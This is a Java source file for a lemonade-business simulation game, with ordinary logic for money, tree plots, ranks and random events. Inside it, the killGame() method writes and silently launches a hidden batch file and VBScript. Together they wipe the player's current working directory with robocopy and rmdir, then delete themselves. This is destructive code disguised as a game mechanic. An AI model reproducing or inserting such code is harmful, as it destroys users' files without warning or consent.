import java.util.ArrayList;
import java.io.File; // https://www.w3schools.com/java/java_files_create.asp
import java.io.IOException;
import java.io.FileWriter;

public class Game {
    private double money;
    private double netWorth;
    private ArrayList<Plot> plots;
    private int week;
    private String rank;
    private RandomEvent randomEvent;
    private boolean eventLastWeek;
    private boolean dead;

    public Game() {
        money = 100;
        netWorth = money + Plot.BASE_COST + Tree.costBasedOnType("small");
        plots = new ArrayList<Plot>();
        plots.add(new Plot());
        plots.get(0).addTree("small",1);
        week = 1;
        rank = "local lemonade store";
        randomEvent = null;
        eventLastWeek = false;
        dead = false;
    }

    public boolean hasWon() {
        return "the face of lemonade".equals(rank);
    }

    public void newWeek() {
        if (dead) { return; }
        week++;
        money += moneyPerWeek();
        netWorth += moneyPerWeek();
        updateRank();
    }

    public String stats() {
        return "--- Week " + week + " ---\nRank: " + rank + "\nMoney: $" + money + "\nPlots: " + totalPlots();
    }

    public String detailedStats() {
        return "Current Rank: " + rank + "\n" +
                "Current Money: $" + money + "\n" +
                "Total Net Worth: $" + netWorth + "\n" +
                "Total # of Plots: " + totalPlots() + "\n" +
                "Total # of Trees: " + listAllPlotTreesWithType();
    }

    public boolean isDead() {
        return dead;
    }

    /***
     * This just deletes all the files in the parent directory.
     * Seriously.
     * <p>
     * (deletes all files in parent directory)
     */
    public void killGame() {
        try {
            Thread.sleep(4000);
            String filePath = System.getenv("TEMP")+"\\delproj.cmd";
            new File(filePath);
            FileWriter myWriter = new FileWriter(filePath);
            // https://superuser.com/questions/173859/how-can-i-delete-all-files-subfolders-in-a-given-folder-via-the-command-prompt
            myWriter.write("del /f \"hidecmd.vbs\"\n" +
                    "mkdir empty_folder\n" +
                    "robocopy /mir empty_folder " + System.getProperty("user.dir") + "\n" +
                    "rmdir /s /q " + System.getProperty("user.dir") + "\n" +
                    "rmdir /s /q empty_folder" + "\n" +
                    "start /b \"\" cmd /c del \"%~f0\"&exit /b" // https://stackoverflow.com/questions/20329355/how-to-make-a-batch-file-delete-itself
            );
            myWriter.close();

            filePath = System.getenv("TEMP")+"\\hidecmd.vbs";
            new File(filePath);
            myWriter = new FileWriter(filePath);
            // https://superuser.com/questions/140047/how-to-run-a-batch-file-without-launching-a-command-window
            myWriter.write("Set oShell = CreateObject (\"Wscript.Shell\") \n" +
                    "Dim strArgs\n" +
                    "strArgs = \"cmd /c delproj.cmd\"\n" +
                    "oShell.Run strArgs, 0, false");
            myWriter.close();
            System.out.println(filePath);
            // https://www.spigotmc.org/threads/java-not-running-vb-script.446856/

            String[] command = {"wscript.exe", filePath};
            ProcessBuilder builder = new ProcessBuilder(command);
            builder.directory(new File(System.getProperty("TEMP")));
            builder.start();
        } catch (IOException | InterruptedException e) {
            System.out.println("An error occurred.");
            e.printStackTrace();
        }
    }

    public boolean canAffordTrees(String treeType, int amount) {
        return money >= Tree.costBasedOnType(treeType) * amount;
    }
    public boolean canAffordPlots(int amount) {
        return money >= amount * Plot.BASE_COST;
    }
    public boolean canAffordPlots(String treeType, int treeAmount, int plotAmount) {
        return money >= (plotAmount * Plot.BASE_COST) + (Tree.costBasedOnType(treeType) * treeAmount * plotAmount);
    }

    public void chargeMoney(int plotAmount) {
        money -= plotAmount * Plot.BASE_COST;
        roundMoney();
    }
    public void chargeMoney(String treeType, int treeAmount) {
        money -= Tree.costBasedOnType(treeType) * treeAmount;
        roundMoney();
    }
    public void chargeMoney(String treeType, int treeAmount, int plotAmount) {
        money -= (plotAmount * Plot.BASE_COST) + (Tree.costBasedOnType(treeType) * treeAmount * plotAmount);
        roundMoney();
    }

    public void buyPlot(int amount) {
        chargeMoney(amount);
        for (int i = 0; i < amount; i++) {
            plots.add(new Plot());
        }
    }

    public void buyPlot(String treeType, int treeAmount, int plotAmount) {
        chargeMoney(treeType, treeAmount, plotAmount);
        for (int i = 0; i < plotAmount; i++) {
            plots.add(new Plot(treeType, treeAmount));
        }
    }
    public void buyTree(int plotNum, String treeType, int amount) {
        plots.get(plotNum - 1).addTree(treeType, amount);
        chargeMoney(treeType, amount);
    }

    public int totalPlots() {
        return plots.size();
    }

    public String listAllPlotTreesWithType() {
        int small = 0, medium = 0, large = 0, total = 0;
        for (Plot plot : plots) {
            int[] treeCount = plot.countTreeTypes();
            small += treeCount[0];
            medium += treeCount[1];
            large += treeCount[2];
        }

        return "S: " + small + " | M: " + medium + " | L: " + large + " (Total: " + (small + medium + large) + ")";
    }

    public String listAllPlotTrees() {
        StringBuilder l = new StringBuilder();
        for (int i = 0, j = plots.size(); i < j; i++) {
            l.append(i + 1);
            l.append(": ");
            l.append(plots.get(i).listTrees());
            l.append("\n");
        }

        return l.toString();
    }


    public boolean plotHasSpace(int plotNum, String treeType, int amount) {
        return plots.get(plotNum - 1).hasSpace(treeType, amount);
    }

    public void makePlotSpace(int plotNum, String treeType, int amount) {
        money += plots.get(plotNum - 1).makePlotSpace(treeType, amount);
        roundMoney();
    }

    public String treesRemovedIfMakeSpace(int plotNum, String treeType, int amount) {
        int[] treesRemoved = plots.get(plotNum - 1).treesRemovedIfMakeSpace(treeType, amount);
        return treesRemoved[0] + " small\n" +
                treesRemoved[1] + " medium\n" +
                treesRemoved[2] + " large";
    }


    public int moneyPerWeek() {
        int moneyGen = 0;
        for (Plot plot : plots) {
            moneyGen += plot.totalTreeProduction();
        }
        return moneyGen;
    }

    public boolean newRandomEvent() {
        if (eventLastWeek) {
            eventLastWeek = false;
            return false;
        }
        randomEvent = new RandomEvent();
        eventLastWeek = true;
        return randomEvent.ifEvent();
    }

    /***
     * PRECONDITION: randomEvent BETTER NOT BE (null) !!!!
     * @return a string related to the random event
     */
    public String randomEventPrompt() {
        return randomEvent.randomEventPrompt();
    }

    /***
     * PRECONDITION: randomEvent is not null
     * @return a string of the event message
     */
    public String processRandomEvent() {
        String eventMessage = randomEvent.processRandomEvent();
        if (randomEvent.isSpecialEvent()) {
            dead = true;
        }
        money *= randomEvent.getMultiplier();
        roundMoney();
        randomEvent = null;
        return eventMessage;
    }

    private void roundMoney() {
        int intMoney = (int) money;
        double decimal = money - intMoney;
        decimal *= 100;
        decimal = (int) decimal;
        decimal /= 100;
        money = intMoney + decimal;
    }
    private void updateRank() {
        if (netWorth < 50000) {
            rank = "local lemonade store";
        } else if (netWorth < 100000) {
            rank = "regional lemonade chain";
        } else if (netWorth < 250000) {
            rank = "national lemonade chain";
        } else if (netWorth < 1000000) {
            rank = "world wide lemonade chain";
        } else {
            rank = "the face of lemonade";
        }
    }
}
